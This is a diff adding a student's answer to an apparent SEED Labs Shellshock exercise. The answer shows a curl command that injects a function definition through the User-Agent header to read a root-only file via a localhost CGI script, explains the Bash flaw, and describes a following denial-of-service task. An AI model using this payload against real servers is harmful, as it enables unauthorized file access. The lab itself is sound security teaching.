@@ -58,5 +58,12 @@ In our setup, we run the Web server and the attack from the same computer, and t
 ### Task  1A:  
 Get  Secret  Data.  After  the  above  CGI  program  is  set  up,  you  can  launch  the Shellshock attack. The attack does not depend on what is in the CGI program, as it targets the Bash program, which is invoked first, before the CGI script is executed. Your goal is to launch the  attack  through  the  URL  http://localhost/cgi-bin/myprog.cgi,  such  that  you  can  achieve something that you cannot do as a remote user. In this task, you need to create an account.db file in directory /usr/lib/cgi-bin using the root account with some random content, e.g.,“ABCDE”. As  a  regular  user  without  the  permission  of  accessing  cgi-bin  folder,  you  now  need  to  get  the content  of  account.db  via  the  Shellshock  attack.  Please  describe  how  your  attack  works.  Note that, your screenshot of successful attack is required for this task.
 
+```sh
+[10/19/21]seed@VM:.../cgi-bin$ sudo ln -sf /bin/bash_shellshock /bin/sh
+10/19/21]seed@VM:.../cgi-bin$ curl -A '() { echo "hello";}; echo Content_type: text/plain; echo; /bin/cat /usr/lib/cgi-bin/account.db' http://localhost/cgi-bi>
+"OZGURURALACCOUNTDB"
+```
+The bash is not vulnerable in the seed setup. The vulnerable bash program on the seed setup is bash_shellshock. Therefore we used the bash_shellshock. We create a database file named account.db under the /usr/lib/cgi-bin and add an entry. Then we use the vulnerability of bash_shellshock and pass an enviroment variable starting with '() {' - indication a function to the child process, using the user-agent header field of the HTTP request. The vulnerability in the bash program not only converts this enviroment variable into function, but also executes the shell commands present in the environment variable string. We could read the db file with using this vulnerability.
+
 ### Task 1B: 
 Crash the Server. In this task, we want to crash the server with the Shellshock attack. This kind of attack typically happens for a deny of service. In this task, the /bin/sleep function is your best friend to use in your attack. If you are not familiar with the sleep function, you can use sleep –help for more information. Please describe how your attack works.
